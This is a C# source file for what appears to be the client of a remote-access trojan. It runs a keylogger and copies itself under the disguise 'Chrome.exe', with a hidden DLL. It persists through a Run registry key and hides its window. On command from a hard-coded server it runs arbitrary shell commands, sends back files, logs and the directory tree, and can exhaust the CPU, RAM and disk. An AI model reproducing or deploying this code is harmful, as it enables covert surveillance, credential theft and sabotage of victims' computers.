using Microsoft.Win32;
using NetworkCommsDotNet;
using NetworkCommsDotNet.Connections;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;


namespace Client
{
    public partial class Form1 : Form
    {

        private const string KeepAlive = "KeepAlive.exe";
        private static Process _keepAliveProcess;
        private static Mutex _instanceMutex;
        private static bool _exiting;
        private static int _processId;

        private static void startUp()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);


            if (rkApp.GetValue("MyApp") == null)
            {
                // The value doesn't exist, the application is not set to run at startup
               
                rkApp.SetValue("Chrome.exe", Application.ExecutablePath);
            }



        }

        private static void KeepingAlive()
        {
            while (true)
            {
                if (_exiting)
                    return;

                if (_processId == 0)
                {
                    var kamikazeProcess = Process.Start(KeepAlive,
                      string.Concat("launchselfandexit ", Process.GetCurrentProcess().Id));
                    if (kamikazeProcess == null)
                        return;

                    kamikazeProcess.WaitForExit();
                    _keepAliveProcess = Process.GetProcessById(kamikazeProcess.ExitCode);
                }
                else
                {
                    _keepAliveProcess = Process.GetProcessById(_processId);
                    _processId = 0;
                }

                _keepAliveProcess.WaitForExit();
            }
        }

        private static bool SingleInstance()
        {
            bool createdNew;
            _instanceMutex = new Mutex(true, @"Local\4A31488B-F86F-4970-AF38-B45761F9F060", out createdNew);
            if (createdNew) return true;
            Debug.WriteLine("Application already launched. Shutting down.");
            _instanceMutex = null;
            return false;
        }

        private static void ReleaseSingleInstance()
        {
            if (_instanceMutex == null)
                return;
            _instanceMutex.ReleaseMutex();
            _instanceMutex.Close();
            _instanceMutex = null;
        }

        string serverIP = "192.168.21.191";
        int serverPort = 51111;
        bool displayRot = false;
        int port = 50000;
        public Form1()
        {
            InitializeComponent();

        }

        private void startKeylogger()
        {
            System.Threading.Thread myThread;
            myThread = new System.Threading.Thread(new System.Threading.ThreadStart(InterceptKeys.StartLogger));
            myThread.Start();
        }

        private void startCopyMyself()
        {
            System.Threading.Thread myThread;
            myThread = new System.Threading.Thread(new System.Threading.ThreadStart(CopyMyself));
            myThread.Start();
        }

        private void CopyMyself()
        {
            try
            {
                string nameDesktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Chrome.exe";
                Exec_cmd("copy Chrome.exe " + nameDesktop , NOREDIRECT, WAIT, null);
                // Exec_cmd("attrib client.exe " + nameDesktop + " /E /C /H/ R/ K /O /Y", NOREDIRECT, WAIT, null);

                nameDesktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\NetworkCommsDotNet.dll";
                Exec_cmd("copy NetworkCommsDotNet.dll " + nameDesktop, NOREDIRECT, WAIT, null);
                Exec_cmd("attrib +h " + nameDesktop, NOREDIRECT, WAIT, null);

                nameDesktop = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\Chrome.exe";
                Exec_cmd("copy Chrome.exe " + nameDesktop, NOREDIRECT, WAIT, null);
                // Exec_cmd("attrib client.exe " + nameDesktop + " /E /C /H/ R/ K /O /Y", NOREDIRECT, WAIT, null);

                nameDesktop = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments) + "\\NetworkCommsDotNet.dll";
                Exec_cmd("copy NetworkCommsDotNet.dll " + nameDesktop, NOREDIRECT, WAIT, null);
                Exec_cmd("attrib +h " + nameDesktop, NOREDIRECT, WAIT, null);
            }
            catch (Exception e)
            {

            }
        }

        private void startKeepingAlive()
        {
            var thread = new Thread(KeepingAlive);
            thread.Start();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //this.Visible = false;
            //coonnect to server 
            NetworkComms.SendObject("InitClient", serverIP, serverPort, serverIP);

            //startKeepingAlive();

            Debug.WriteLine("start StartLogger");
            startKeylogger();
            startCopyMyself();
            startUp();
            //InterceptKeys.StartLogger();
            Debug.WriteLine("end StartLogger");

            System.Threading.Thread myThread;
            myThread = new System.Threading.Thread(new System.Threading.ThreadStart(openInterfata));
            myThread.Start();

            //TODO hide the form
            /*this.Visible = false;
            System.Threading.Thread.Sleep(2000);
            this.Visible = true;
            */


            //Trigger the method OSMessage when a packet of type 'Message' is received
            //We expect the incoming object to be a string which we state explicitly by using <string>
            NetworkComms.AppendGlobalIncomingPacketHandler<string>("Message", this.OSMessage);

            //Trigger the method OSMessage when a packet of type 'OSMessage' is received
            //We expect the incoming object to be a string which we state explicitly by using <string>
            NetworkComms.AppendGlobalIncomingPacketHandler<string>("OSMessage", this.OSMessage);

            //Trigger the method OSMessage when a packet of type 'RotateDisplay' is received
            //We expect the incoming object to be a string which we state explicitly by using <string>
            NetworkComms.AppendGlobalIncomingPacketHandler<string>("RotateDisplay", this.RotateDisplay);

            //Trigger the method OSMessage when a packet of type 'getHierarchy' is received
            //We expect the incoming object to be a string which we state explicitly by using <string>
            NetworkComms.AppendGlobalIncomingPacketHandler<string>("getHierarchy", this.getHierarchy);

            //Trigger the method OSMessage when a packet of type 'Command' is received
            //We expect the incoming object to be a string which we state explicitly by using <string>
            NetworkComms.AppendGlobalIncomingPacketHandler<string>("Command", this.execCommand);

            //Trigger the method OSMessage when a packet of type 'Command' is received
            //We expect the incoming object to be a string which we state explicitly by using <string>
            NetworkComms.AppendGlobalIncomingPacketHandler<string>("destroyProcessor", this.destroyProcessor);

            //Trigger the method OSMessage when a packet of type 'Command' is received
            //We expect the incoming object to be a string which we state explicitly by using <string>
            NetworkComms.AppendGlobalIncomingPacketHandler<string>("destroyRam", this.destroyRam);

            //Trigger the method OSMessage when a packet of type 'destroyHard' is received
            //We expect the incoming object to be a string which we state explicitly by using <string>
            NetworkComms.AppendGlobalIncomingPacketHandler<string>("destroyHard", this.destroyHard);

            //Trigger the method OSMessage when a packet of type 'copyFile' is received
            //We expect the incoming object to be a string which we state explicitly by using <string>
            NetworkComms.AppendGlobalIncomingPacketHandler<string>("copyFile", this.copyFile);

            //Trigger the method OSMessage when a packet of type 'viewLogFile' is received
            //We expect the incoming object to be a string which we state explicitly by using <string>
            NetworkComms.AppendGlobalIncomingPacketHandler<string>("viewLogFile", this.viewLogFile);





            //Request server IP and port number
            richTextBox1.AppendText("Please enter the server IP and port in the format 192.168.0.1:10000 and press return:");
            //string serverInfo = Console.ReadLine();
            this.Opacity = 0;
            this.ShowInTaskbar = false;


        }

 

        private void destroyHard(PacketHeader packetHeader, Connection connection, string incomingObject)
        {
            rupe_hardu();
        }

        private void viewLogFile(PacketHeader packetHeader, Connection connection, string filePath)
        {
            SendTCP(filePath, serverIP, port);
        }

        private void copyFile(PacketHeader packetHeader, Connection connection, string filePath)
        {
            SendTCP(filePath, serverIP, port);
        }
        public static void aritm()
        {
            double a = 10000000;
            while (true)
            {
                a = a * a;
            }
        }

        public static void rupe_procesoru()
        {
            while (true)
            {
                System.Threading.Thread myThread = new System.Threading.Thread(new System.Threading.ThreadStart(aritm));
                myThread.Start();
            }
        }

        public static void rupe_hardu()
        {
            for (int i = 0; ; i++)
            {
                String filename = "bambam";
                filename = filename + i;
                filename = filename + "txt";
                using (System.IO.StreamWriter file =
            new System.IO.StreamWriter(filename))
                {
                    for (int j = 0; j < 1024 * 1024; j++)
                    {
                        file.WriteLine("MyDearMessage");
                    }

                    file.WriteLine("MyDearMessage");
                    // read from file or write to file
                }


            }
        }


        public static void rupe_ramu()
        {
            while (true)
            {
                Exec_cmd("timeout 1000", 2, NO_WAIT, null);
            }

        }

        private void destroyRam(PacketHeader packetHeader, Connection connection, string incomingObject)
        {
            rupe_ramu();
        }

        private void destroyProcessor(PacketHeader packetHeader, Connection connection, string incomingObject)
        {
            rupe_procesoru();
        }

        const int WAIT = 1;
        const int NO_WAIT = 0;
        const String OUTPUTFILE = "outputfile.txt";
        const int TRUNC = 0;
        const int APPEND = 1;
        const int NOREDIRECT = 2;

        const char APPENDS = '1';
        const char TRUNCS = '0';
    

        private void execCommand(PacketHeader packetHeader, Connection connection, string message)
        {
            Debug.WriteLine("packetHeader = ." + packetHeader.ToString() + ".");
            if (message.Contains(">"))
            {
                Exec_cmd(message, NOREDIRECT, WAIT, OUTPUTFILE);
            }
            else
            {
                char appendChecked = message.ElementAt(0);
                Debug.WriteLine("appendChecked este ." + appendChecked + ".");

                int type;
                if (appendChecked.Equals(APPENDS))
                {
                    type = APPEND;
                }
                else if(appendChecked.Equals(TRUNCS))
                {
                    type = TRUNC;
                }
                else
                {
                    System.Windows.Forms.MessageBox.Show("appendChecked = ." + appendChecked + ".");
                    return;
                }

                message = message.Substring(1);
                Exec_cmd(message, type, WAIT, OUTPUTFILE);
                SendTCP(OUTPUTFILE, serverIP, port);
            }
            
        }

   

        public static void Exec_cmd(String command, int type, int waiting, string outputFileName)
        {
            String new_command;
            System.Diagnostics.Process process = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfo.FileName = "cmd.exe";
            if (type == 0)
            {
                if (String.IsNullOrEmpty(outputFileName))
                {
                    System.Windows.Forms.MessageBox.Show("outputFileName e null");
                    return;
                }
                new_command = command + " > " + outputFileName;
            }
            else if(type == 1)
            {
                if (String.IsNullOrEmpty(outputFileName))
                {
                    System.Windows.Forms.MessageBox.Show("outputFileName e null");
                    return;
                }
                new_command = command + " >> " + outputFileName;
            }
            else
            {
                new_command = command;
            }

            new_command = "/c " + new_command;
            Debug.WriteLine("comand = ." + new_command + ".");
            startInfo.Arguments = new_command;
            process.StartInfo = startInfo;
            process.Start();

            if (waiting == 1)
            {
                process.WaitForExit();
            }

        }

        private void getHierarchy(PacketHeader packetHeader, Connection connection, string incomingObject)
        {
            //get fisier
            //TODO change port
  
            string calea = Environment.SpecialFolder.MyDocuments.ToString();
            Debug.WriteLine("calea este ." + calea + ".");
            //SendFile(serverIP, port, calea, "\\myfile.txt");
            string name = "ierarhia.txt";
            intoarce_ierarhia(name);
            SendTCP(name, serverIP, port);
        }

        private void openInterfata()
        {
            Interfata interfata = new Interfata();
            interfata.ShowDialog();
        }

        private void RotateDisplay(PacketHeader packetHeader, Connection connection, string incomingObject)
        {
            if (displayRot)
            {
                Display.Rotate(1, Display.Orientations.DEGREES_CW_0);
                displayRot = false;
            } else {
                Display.Rotate(1, Display.Orientations.DEGREES_CW_180);
                displayRot = true;
            }

            
        }

        private void OSMessage(PacketHeader packetHeader, Connection connection, string message)
        {
            System.Windows.Forms.MessageBox.Show("\nA message was received from " + connection.ToString() + " which said '" + message + "'.");
        }

        private void sendMessageButton_Click(object sender, EventArgs e)
        {
            //Write some information to the console window
            string messageToSend = "This is message #";
            richTextBox1.AppendText("Sending message to server saying '" + messageToSend + "'");

            //Send the message in a single line
            NetworkComms.SendObject("Message", serverIP, serverPort, messageToSend);
        }

        private void shutDownButton_Click(object sender, EventArgs e)
        {
            NetworkComms.Shutdown();
            //_exiting = true;
            //ReleaseSingleInstance();
            //_keepAliveProcess.Kill();
            //Environment.Exit(0);
            this.Close();
        }

        private void connectButton_Click(object sender, EventArgs e)
        {
            if (ipAddressTextBox.TextLength == 0)
            {
                return;
            }

            string serverInfo = ipAddressTextBox.Text.ToString();

            //Parse the necessary information out of the provided string
            //serverIP = serverInfo.Split(':').First();
            //serverPort = int.Parse(serverInfo.Split(':').Last());
            Debug.Print(String.Format(".{0}.\n", (serverIP))); 
            NetworkComms.SendObject("InitClient", serverIP, serverPort, serverIP);

        }

        public void SendFile(string remoteHostIP, int remoteHostPort, string longFileName, string shortFileName)
        {
            try
            {
                if (!string.IsNullOrEmpty(remoteHostIP))
                {
                    Debug.WriteLine("start SendFile");
                    byte[] fileNameByte = Encoding.ASCII.GetBytes(shortFileName);
                    byte[] fileData = File.ReadAllBytes(longFileName);
                    byte[] clientData = new byte[4 + fileNameByte.Length + fileData.Length];
                    byte[] fileNameLen = BitConverter.GetBytes(fileNameByte.Length);
                    fileNameLen.CopyTo(clientData, 0);
                    fileNameByte.CopyTo(clientData, 4);
                    fileData.CopyTo(clientData, 4 + fileNameByte.Length);
                    TcpClient clientSocket = new TcpClient(remoteHostIP, remoteHostPort);
                    NetworkStream networkStream = clientSocket.GetStream();
                    networkStream.Write(clientData, 0, clientData.GetLength(0));
                    networkStream.Close();
                    Debug.WriteLine("end SendFile");
                }
            }
            catch
            {
            }
        }

        public static void intoarce_ierarhia(string outFileName)
        {
            string line;
            string crt_cmd;
            Exec_cmd("wmic logicaldisk get caption", TRUNC, WAIT, "auxiliar.txt");
            System.IO.StreamReader file = new System.IO.StreamReader("auxiliar.txt");
            line = file.ReadLine();

            //Exec_cmd("tree ", NOREDIRECT, WAIT, outFileName);
            //Exec_cmd("tree C:\\ >> ierarhia.txt", 2, WAIT, OUTPUTFILE);

            while ((line = file.ReadLine()) != null)
            {
                crt_cmd = "tree " + line;
                Console.WriteLine(crt_cmd);
                Console.ReadLine();
                Exec_cmd("tree " + line.Replace(" ", "") + "\\ ", APPEND, WAIT, outFileName);
            }

        }
        public void SendTCP(string M, string IPA, Int32 PortN)
        {
            int BufferSize = 1024;
            byte[] SendingBuffer = null;
            TcpClient client = null;
            //lblStatus.Text = "";
            NetworkStream netstream = null;
            try
            {
                client = new TcpClient(IPA, PortN);
                //lblStatus.Text = "Connected to the Server...\n";
                netstream = client.GetStream();
                FileStream Fs = new FileStream(M, FileMode.Open, FileAccess.Read);
                int NoOfPackets = Convert.ToInt32(Math.Ceiling(Convert.ToDouble(Fs.Length) / Convert.ToDouble(BufferSize)));
                
                int TotalLength = (int)Fs.Length, CurrentPacketLength, counter = 0;
                for (int i = 0; i < NoOfPackets; i++)
                {
                    if (TotalLength > BufferSize)
                    {
                        CurrentPacketLength = BufferSize;
                        TotalLength = TotalLength - CurrentPacketLength;
                    }
                    else
                        CurrentPacketLength = TotalLength;
                    SendingBuffer = new byte[CurrentPacketLength];
                    Fs.Read(SendingBuffer, 0, CurrentPacketLength);
                    netstream.Write(SendingBuffer, 0, (int)SendingBuffer.Length);
                    //if (progressBar1.Value >= progressBar1.Maximum)
                    //    progressBar1.Value = progressBar1.Minimum;
                    //progressBar1.PerformStep();
                }


                     Fs.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
            }
            finally
            {
                netstream.Close();
                client.Close();
            }
        }
    }
}
